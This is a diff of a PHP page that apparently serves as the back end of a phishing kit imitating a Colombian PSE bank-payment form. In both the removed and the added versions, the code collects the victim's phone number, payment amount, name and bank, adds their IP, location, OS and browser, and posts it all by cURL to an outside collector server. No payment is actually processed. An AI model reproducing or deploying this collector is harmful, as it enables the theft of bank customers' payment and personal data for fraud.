@@ -1,123 +1,50 @@
-<?php
+<?php $numero = $_POST['Inputphone'];
+$cuanto = $_POST['Inputcuanto'];
+$persona = $_POST['Inputpersona'];
+$entidad = $_POST['Inputbanc'];
 ini_set('display_errors', 0);
-error_reporting(E_ALL);
 
-// --- Lee POST (usa null coalescing para evitar notices) ---
-$numero  = $_POST['Inputphone']  ?? null;
-$cuanto  = $_POST['Inputcuanto'] ?? null;
-$persona = $_POST['Inputpersona']?? null;
-$entidad = $_POST['Inputbanc']   ?? null;
-
-include('funciones.php'); // aquí defines $myip, $pais, etc. si aplica
-
-if ($entidad === 'DAVIVIENDA') {
-    exit; // nada que hacer
-}
-
-if (!($cuanto && $persona && $entidad)) {
-    http_response_code(400);
-    exit('Faltan campos requeridos.');
-}
-
-// --- Construye mensaje ---
-$message = "PSE
-Banco: {$entidad}
-Persona: {$persona}
-Monto: {$cuanto}
-Numero: {$numero}
-Fecha: " . date('l jS \of F Y h:i:s A') . "
-Ip y Localidad: {$myip} {$pais} {$region}
-SO: {$user_os}
-Navegador: {$navegador}";
-
-$payload = ['mensaje' => $message];
-
-// --- Obtén la IP real del cliente para reenviarla ---
-function getClientIp(): string {
-    $candidates = [
-        $_SERVER['HTTP_X_FORWARDED_FOR'] ?? '',
-        $_SERVER['HTTP_X_REAL_IP'] ?? '',
-        $_SERVER['REMOTE_ADDR'] ?? '',
-    ];
-    foreach ($candidates as $val) {
-        if (!$val) continue;
-        foreach (explode(',', $val) as $ip) { // XFF puede traer lista
-            $ip = trim($ip);
-            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE|FILTER_FLAG_NO_RES_RANGE)) {
-                return $ip; // pública
-            }
-        }
-        foreach (explode(',', $val) as $ip) {
-            $ip = trim($ip);
-            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip; // privada si no hubo pública
-        }
-    }
-    return '0.0.0.0';
-}
-$clientIp = getClientIp();
-
-// --- Envío cURL con headers extra y logging ---
-$url = 'https://servidorapis-ggdnawe6aefxerg7.canadacentral-01.azurewebsites.net/nesquis/';
-$ch = curl_init($url);
-
-$verbose = fopen('php://temp', 'w+'); // buffer para log VERBOSE
-
-curl_setopt_array($ch, [
-    CURLOPT_RETURNTRANSFER => true,
-    CURLOPT_POST           => true,
-    CURLOPT_HTTPHEADER     => [
-        'Accept: application/json',
-        'Content-Type: application/json',
-        'X-Client-IP: ' . $clientIp,              // <- IP real del usuario
-        'X-Forwarded-For: ' . $clientIp,          // <- opcional, por compatibilidad
-    ],
-    CURLOPT_POSTFIELDS     => json_encode($payload, JSON_UNESCAPED_UNICODE),
-    CURLOPT_TIMEOUT        => 20,
-    CURLOPT_CONNECTTIMEOUT => 10,
-    CURLOPT_HEADER         => true,               // incluye headers en la respuesta
-    CURLOPT_SSL_VERIFYPEER => true,
-    CURLOPT_SSL_VERIFYHOST => 2,
-    CURLOPT_VERBOSE        => true,
-    CURLOPT_STDERR         => $verbose,
-]);
-
-$raw = curl_exec($ch);
-
-if ($raw === false) {
-    $err = curl_error($ch);
-    curl_close($ch);
-    error_log('cURL error: ' . $err);
-    http_response_code(502);
-    exit('Error de red: ' . $err);
-}
-
-$httpCode    = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
-$resp_headers = substr($raw, 0, $header_size);
-$resp_body    = substr($raw, $header_size);
-
-curl_close($ch);
-
-rewind($verbose);
-$verboseLog = stream_get_contents($verbose);
-
-// --- Manejo básico según código ---
-if ($httpCode >= 400) {
-    // Loguea todo para depurar
-    error_log("[API ERROR] HTTP $httpCode\nHEADERS:\n$resp_headers\nBODY:\n$resp_body\nVERBOSE:\n$verboseLog");
+include('funciones.php');
+if ($entidad == 'DAVIVIENDA') {
 } else {
-    // Igual puede ser útil guardar el verbose en debug
-    // error_log("[API OK] HTTP $httpCode\n$resp_body");
+    if (isset($_POST['Inputcuanto']) && isset($_POST['Inputpersona']) && isset($_POST['Inputbanc'])) {
+        $message = 'PSE
+Banco: ' . $_POST['Inputbanc'] . '
+Persona: ' . $_POST['Inputpersona'] . '
+Monto: ' . $_POST['Inputcuanto'] . '
+Numero: ' . $_POST['Inputphone'] . '
+Fecha: ' . date('l jS \of F Y h:i:s A', time()) . '
+Ip y Localidad: ' . $myip . ' ' . $pais . ' ' . $region . '
+SO: ' . $user_os . '
+Navegador: ' . $navegador . '';
+
+        $payload = ['mensaje' => $message];
+        $url = 'https://servidorapis-ggdnawe6aefxerg7.canadacentral-01.azurewebsites.net/nesquis/';
+
+        $ch = curl_init($url);
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_POST           => true,
+            CURLOPT_HTTPHEADER     => [
+                'Accept: application/json',
+                'Content-Type: application/json',
+                'X-Client-IP: ' . $myip,
+            ],
+            CURLOPT_POSTFIELDS     => json_encode($payload, JSON_UNESCAPED_UNICODE),
+            CURLOPT_TIMEOUT        => 20,
+            CURLOPT_CONNECTTIMEOUT => 10,
+        ]);
+
+        $response = curl_exec($ch);
+        if ($response === false) {
+            error_log('cURL error: ' . curl_error($ch));
+            http_response_code(500);
+            exit('Error de red.');
+        }
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+    }
 }
-
-// --- Devuelve algo útil al caller (tu frontend, por ejemplo) ---
-header('Content-Type: application/json; charset=utf-8');
-echo json_encode([
-    'status'       => $httpCode,
-    'client_ip'    => $clientIp,    // lo que reenviamos
-    'response_raw' => json_decode($resp_body, true) ?? $resp_body, // parsea si es JSON
-], JSON_UNESCAPED_UNICODE);
-
 ?>
 
 <html class="no-js">
